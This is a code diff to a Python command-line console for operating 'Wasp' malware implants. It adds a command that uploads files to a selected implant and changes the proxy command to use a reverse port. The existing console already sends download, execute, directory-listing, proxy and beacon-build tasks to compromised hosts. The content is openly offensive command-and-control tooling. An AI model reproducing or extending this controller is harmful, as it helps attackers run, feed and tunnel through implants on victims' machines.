@@ -10,7 +10,7 @@ from pathlib import Path
 
 from constants import WASP_HOME, WASPS_PATH
 from wasp_types import WaspMalware, WaspCommand, WaspResponse, logger, WaspException
-from wasp_commands import WaspCommandDownload, WaspCommandExecute, WaspCommandFileList, WaspCommandProxy
+from wasp_commands import WaspCommandDownload, WaspCommandExecute, WaspCommandFileList, WaspCommandProxy, WaspCommandUpload
 from wasp_builder import WaspBuildConfiguration
 
 class WaspUI(object):
@@ -72,6 +72,10 @@ if __name__ == '__main__':
 
     download_parser = subparser.add_parser("download", help="Download a file from the Wasp")
     download_parser.add_argument("PATH", type=Path, help="The path the file to download from Wasp")
+
+    upload_parser = subparser.add_parser("upload", help="Upload a file to the Wasp")
+    upload_parser.add_argument("SOURCE_PATH", type=Path, help="The path the file to upload to Wasp")
+    upload_parser.add_argument("DESTINATION_PATH", type=Path, help="The path on the Wasp to write the file to")
    
     file_list_parser = subparser.add_parser("ls", aliases=["directory-list", "dir"], help="List a directory on the Wasp", exit_on_error=False)
     file_list_parser.add_argument("PATH", type=Path, help="The path to list on the Wasp")
@@ -102,6 +106,7 @@ if __name__ == '__main__':
         select_parser,
         command_parser,
         download_parser,
+        upload_parser,
         proxy_parser,
         build_parser,
     ]:
@@ -133,6 +138,11 @@ if __name__ == '__main__':
                     if ui.selected_wasp:
                         task = WaspCommandDownload(ui.selected_wasp, path)
                         ui.submit_command(task)
+                case 'upload':
+                    path = args.SOURCE_PATH
+                    if ui.selected_wasp:
+                        task = WaspCommandUpload(ui.selected_wasp, args.DESTINATION_PATH, path)
+                        ui.submit_command(task)
                 case 'ls':
                     path = args.PATH
                     if ui.selected_wasp:
@@ -143,11 +153,11 @@ if __name__ == '__main__':
                         for command in ui.selected_wasp.get_tasks():
                             print(command)
                 case 'proxy':
-                    listen_port = args.LISTEN_PORT
+                    reverse_port = args.REVERSE_PORT
                     destination_host = args.DESTINATION_HOST
                     destination_port = args.DESTINATION_PORT
                     if ui.selected_wasp:
-                        task = WaspCommandProxy(ui.selected_wasp, listen_port, destination_host, destination_port)
+                        task = WaspCommandProxy(ui.selected_wasp, reverse_port, destination_host, destination_port)
                         ui.submit_command(task)
                 case 'build':
                     config = WaspBuildConfiguration(args.beacon_url, args.backup_beacon_url)
